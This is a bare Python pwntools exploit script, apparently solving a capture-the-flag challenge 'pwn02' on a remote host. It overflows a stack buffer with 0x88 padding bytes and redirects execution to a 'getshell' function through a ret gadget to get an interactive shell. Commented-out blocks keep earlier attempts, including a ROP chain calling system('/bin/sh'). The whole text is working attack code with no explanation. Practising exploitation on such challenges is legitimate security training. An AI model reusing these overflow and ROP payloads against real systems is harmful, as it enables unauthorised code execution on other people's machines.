from pwn import *

e = ELF("./pwn02")
#p = process("./pwn02")
p = remote("bksec.team", 4327)

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

print p.recv()

'''buf = 'A'*(0x80+8)
eip = e.symbols['getshell']

payload = buf + p64(eip)

p.sendline(payload)
p.interactive()'''

'''buf = 'A'*(0x80+8)
pop_rdi = int("0x4007a3", 16)
binsh_addr = int("0x4007c4", 16)
system_addr = e.symbols['system']

payload = buf + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

p.sendline(payload)
p.interactive()'''

'''
buf = 'A'*(0x80+8)
pop_rdi = int("0x4007a3", 16)
getshell_addr = e.symbols['getshell']

payload = buf + p64(pop_rdi) + 'A'*8 + p64(getshell_addr)

p.sendline(payload)
p.interactive()'''

buf = 'A'*(0x80+8)
ret = int("0x400546", 16)
getshell_addr = e.symbols['getshell']

payload = buf + p64(ret) + p64(getshell_addr)

p.sendline(payload)
p.interactive()
